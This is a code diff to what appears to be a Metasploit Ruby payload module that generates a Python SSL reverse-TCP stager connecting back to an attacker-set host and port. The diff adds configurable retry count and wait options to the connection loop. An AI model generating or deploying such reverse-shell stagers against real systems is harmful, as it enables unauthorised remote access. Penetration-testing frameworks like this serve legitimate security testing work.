@@ -15,6 +15,15 @@ module Payload::Python::ReverseTcpSsl
 
   include Msf::Payload::Python
   include Msf::Payload::Python::ReverseTcp
+  def initialize(*args)
+    super
+    register_advanced_options([
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
+        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts',5])
+      ], self.class)
+  end
+  
+  
 
   #
   # Generate the first stage
@@ -23,7 +32,8 @@ module Payload::Python::ReverseTcpSsl
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
-      retry_wait:  datastore['StagerRetryWait']
+      retry_count: datastore['StagerRetryCount'],
+      retry_wait:  datastore['StagerRetryWait'],
     }
 
     generate_reverse_tcp_ssl(conf)
@@ -44,22 +54,26 @@ module Payload::Python::ReverseTcpSsl
   def generate_reverse_tcp_ssl(opts={})
     # Set up the socket
     cmd  = "import ssl,socket,struct#{datastore['StagerRetryWait'].to_i > 0 ? ',time' : ''}\n"
-    if datastore['StagerRetryWait'].blank? # do not retry at all (old style)
+    if opts[:retry_wait].blank? # do not retry at all (old style)
       cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
       cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
       cmd << "s=ssl.wrap_socket(so)\n"
     else
-      cmd << "while 1:\n"
+      if opts[:retry_count]>0
+        cmd << "for x in range(#{opts[:retry_count].to_i}):\n" 
+      else
+        cmd << "while 1:\n"
+      end
       cmd << "\ttry:\n"
       cmd << "\t\tso=socket.socket(2,1)\n" # socket.AF_INET = 2
       cmd << "\t\tso.connect(('#{opts[:host]}',#{opts[:port]}))\n"
       cmd << "\t\ts=ssl.wrap_socket(so)\n"
       cmd << "\t\tbreak\n"
       cmd << "\texcept:\n"
-      if datastore['StagerRetryWait'].to_i <= 0
+      if opts[:retry_wait].to_i <= 0
         cmd << "\t\tpass\n" # retry immediately
       else
-        cmd << "\t\ttime.sleep(#{datastore['StagerRetryWait'].to_i})\n" # retry after waiting
+        cmd << "\t\ttime.sleep(#{opts[:retry_wait]})\n" # retry after waiting
       end
     end
     cmd << py_send_uuid if include_send_uuid
